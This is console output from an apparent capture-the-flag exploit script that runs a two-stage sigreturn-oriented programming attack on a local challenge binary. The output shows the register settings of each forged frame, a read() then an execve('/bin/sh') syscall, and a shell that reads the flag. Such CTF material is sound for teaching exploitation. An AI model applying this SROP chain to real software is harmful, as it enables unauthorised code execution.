```
python3 pwn-srop.py BIN=./chal.bin 
[*] '/demos/srop-demo/chal.bin'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x40000)
    Stack:    Executable
    RWX:      Has RWX segments
[*] Loading gadgets for '/demos/srop-demo/chal.bin'
[+] Starting local process '/demos/srop-demo/chal.bin': pid 2244
[*] Sending Stage 1 SROP
[*] Setting RAX = 0xf 
[*] Calling 0x41015
[*] [SROP Frame Setting Registers]
[*] RAX = 0x0
[*] RDI = 0x0
[*] RSI = 0x41500
[*] RDX = 0x1000
[*] RSP = 0x41508
[*] RIP = 0x41015
[*] read(rdi=0x0, rsi=0x41500, rdx=0x1000) 
[*] Paused (press any to continue)
[*] Sending Stage 2 SROP
[*] Setting RAX = 0xf 
[*] Calling 0x41015
[*] [SROP Frame Setting Registers]
[*] RAX = 0x3b
[*] RDI = 0x41500
[*] RSI = 0x0
[*] RDX = 0x0
[*] RIP = 0x41015
[*] execve(rdi=0x41500->/bin/sh, rsi=0x0=NULL, rdx=0x0=NULL) 
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ cat flag.txt
flag{i_sure_wished_this_worked_remotely_too}
```
